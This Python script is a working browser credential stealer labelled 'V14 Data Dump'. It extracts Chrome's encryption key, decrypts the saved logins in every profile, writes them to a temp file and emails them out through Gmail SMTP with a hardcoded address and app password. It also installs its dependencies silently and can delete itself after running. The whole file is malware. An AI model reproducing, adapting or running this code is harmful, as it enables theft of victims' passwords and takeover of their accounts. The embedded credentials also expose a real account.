import os
import json
import shutil
import base64
import sqlite3
import smtplib
import subprocess
import sys
import tempfile
import urllib.request
import platform
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email import encoders

# ---------------- CONFIG ----------------
EMAIL_ADDRESS = "vanshmishragaming1977@gmail.com"
EMAIL_PASSWORD = "tflkkdbfywrkipyi"  # Gmail App Password
TEMP_FILE = os.path.join(tempfile.gettempdir(), "dump_v14.json")
SELF_DELETE = False  # True = Delete after execution
# ----------------------------------------

# ----------- AUTO-INSTALL -----------
def ensure_python():
    """Ensure Python is installed (for .py runs)."""
    try:
        import shutil
        if not shutil.which("python"):
            print("Python not found, installing...")
            url = "https://www.python.org/ftp/python/3.12.5/python-3.12.5-amd64.exe"
            installer = "python_installer.exe"
            urllib.request.urlretrieve(url, installer)
            subprocess.run([installer, "/quiet", "InstallAllUsers=1", "PrependPath=1"], check=True)
            os.remove(installer)
        else:
            print("Python is already installed.")
    except Exception as e:
        print(f"[!] Python check failed: {e}")

def ensure_requirements():
    """Install missing Python packages."""
    packages = ["pycryptodome", "browser_cookie3", "pywin32"]
    for pkg in packages:
        try:
            __import__(pkg.replace("-", "_"))
        except ImportError:
            print(f"Installing {pkg}...")
            subprocess.call([sys.executable, "-m", "pip", "install", pkg, "--quiet"])

# ----------- CHROME PASSWORD DUMP -----------
from Crypto.Cipher import AES
import win32crypt

def get_chrome_master_key():
    local_state_path = os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    return win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]

def decrypt_chrome_password(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        return "FAILED"

def dump_chrome_passwords():
    key = get_chrome_master_key()
    data = []
    user_data_path = os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data")
    profiles = [p for p in os.listdir(user_data_path) if p.startswith("Default") or p.startswith("Profile")]

    for profile in profiles:
        login_db = os.path.join(user_data_path, profile, "Login Data")
        if os.path.exists(login_db):
            temp_db = os.path.join(tempfile.gettempdir(), "login_data_temp")
            shutil.copy2(login_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, username, password in cursor.fetchall():
                data.append({
                    "browser": "Chrome",
                    "profile": profile,
                    "url": url,
                    "username": username,
                    "password": decrypt_chrome_password(password, key)
                })
            conn.close()
            os.remove(temp_db)
    return data

# ----------- EMAIL SENDER -----------
def send_email(file_path):
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_ADDRESS
        msg['Subject'] = "V14 Data Dump"

        with open(file_path, "rb") as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file_path)}')
        msg.attach(part)

        server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()
        print("[+] Email sent successfully.")
    except Exception as e:
        print(f"[!] Email send failed: {e}")

# ----------- MAIN LOGIC -----------
def save_and_mail(data):
    with open(TEMP_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)
    send_email(TEMP_FILE)

def self_delete():
    exe_path = sys.argv[0]
    try:
        os.remove(exe_path)
    except:
        pass

def main():
    ensure_python()
    ensure_requirements()
    all_data = []
    all_data.extend(dump_chrome_passwords())
    save_and_mail(all_data)
    if SELF_DELETE:
        self_delete()

if __name__ == "__main__":
    main()
